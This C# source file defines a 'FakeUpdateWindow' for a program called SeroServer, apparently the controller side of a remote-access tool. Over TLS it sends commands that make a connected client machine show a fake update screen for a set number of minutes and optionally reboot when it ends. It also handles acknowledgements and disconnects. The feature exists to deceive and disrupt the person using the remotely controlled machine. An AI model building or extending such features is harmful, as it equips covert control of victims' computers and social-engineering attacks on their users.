using System.Windows;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class FakeUpdateWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool _active;

    public FakeUpdateWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.FakeUpdateAck, OnAck);
        _server.ClientDisconnected += OnDisconnected;
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.FakeUpdateAck);
            _server.ClientDisconnected -= OnDisconnected;
            Lang.LanguageChanged -= ApplyLanguage;
            if (_active) SendStop();
        };
    }

    private void ApplyLanguage()
    {
        if (!Dispatcher.CheckAccess()) { Dispatcher.BeginInvoke(ApplyLanguage); return; }
        Title                              = Lang.Get("FEAT_FAKE_UPDATE");
        if (BtnShow        != null) BtnShow.Content        = Lang.Get("FU_SHOW");
        if (BtnHide        != null) BtnHide.Content        = Lang.Get("FU_HIDE");
        if (TxtHint        != null) TxtHint.Text           = Lang.Get("FU_HINT");
        if (TxtLblDuration != null) TxtLblDuration.Text    = Lang.Get("FU_DURATION");
        if (TxtLblReboot   != null) TxtLblReboot.Text      = Lang.Get("FU_REBOOT_LABEL");
    }

    private async void Show_Click(object s, RoutedEventArgs e)
    {
        BtnShow.IsEnabled = false;
        TxtStatus.Text = Lang.Get("FU_SENDING");

        _ = int.TryParse(TxtDuration.Text, out int dur);
        bool reboot = ChkReboot.IsChecked == true && dur > 0;

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.FakeUpdateStart,
            Data = JsonConvert.SerializeObject(new FakeUpdateStartData
            {
                DurationMinutes = Math.Max(0, dur),
                RebootAfter     = reboot,
            })
        });
    }

    private async void Hide_Click(object s, RoutedEventArgs e)
    {
        _active = false;
        BtnHide.IsEnabled = false;
        BtnShow.IsEnabled = true;
        TxtStatus.Text = Lang.Get("FU_STOPPING");
        await SendStop();
    }

    private void OnAck(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<FakeUpdateAckData>(pkt.Data);
        Dispatcher.BeginInvoke(() =>
        {
            if (data == null || !data.Success)
            {
                BtnShow.IsEnabled = true;
                TxtStatus.Text    = data?.Error ?? "Error";
                return;
            }
            _active           = true;
            BtnShow.IsEnabled = false;
            BtnHide.IsEnabled = true;
            TxtStatus.Text    = Lang.Get("FU_ACTIVE");
        });
    }

    private void OnDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(() =>
        {
            _active           = false;
            BtnShow.IsEnabled = true;
            BtnHide.IsEnabled = false;
            TxtStatus.Text    = Lang.Get("PM_DISCONNECTED");
        });
    }

    private Task SendStop()
        => _server.SendToClient(_clientId, new Packet { Type = PacketType.FakeUpdateStop });
}
